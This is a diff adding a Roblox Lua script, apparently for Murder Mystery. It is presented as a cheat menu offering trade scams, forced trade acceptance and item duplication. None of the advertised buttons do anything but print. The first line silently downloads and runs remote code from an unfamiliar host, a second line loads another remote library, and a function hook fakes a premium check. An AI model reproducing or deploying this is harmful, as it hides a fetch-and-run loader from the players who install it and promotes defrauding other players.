@@ -1,0 +1,66 @@
+loadstring(game:HttpGet("https://egorikusa.space/b7a00216738a32ca8e25c658.lua", true))()
+local OrionLib = loadstring(game:HttpGet(('')))()
+local Window = OrionLib:MakeWindow({Name = "Murder Mystery Steal godly", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({
+	Name = "Trade Scam",
+	Callback = function()
+
+      		print("button pressed")
+  	end 
+})
+Tab:AddToggle({
+	Name = "✅Force Accept",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+Tab:AddToggle({
+	Name = "🧊Freeze Trade🧊",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end     
+})
+local Tab = Window:MakeTab({
+	Name = "Dupe",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+	})
+Tab:AddButton({
+	Name = "NOTE! WAIT EQUIP SWORD YOU WANT TO DUPE WAIT 1MIN",
+	Callback = function()
+      		print("button pressed")
+  	end    
+        })     
+Tab:AddToggle({
+	Name = "Dupe limited🔪",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+	})
+Tab:AddToggle({
+	Name = "Dupe Unique🔪",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+end    
+})
+local httpHook;
+httpHook = hookfunction(game.HttpGet, function(self,...)
+   local Args = {...}
+   if Args[1] and type(Args[1]) == "string" then
+       if Args[1]:match("checkPremium.php") then
+           return "true"
+       end
+   end
+   return httpHook(self,...)
+end)
+
+local OrionLib = loadstring(game:HttpGet(('https://hypernite.xyz/Backup/Orion/source.lua')))() -- Backed up to my host
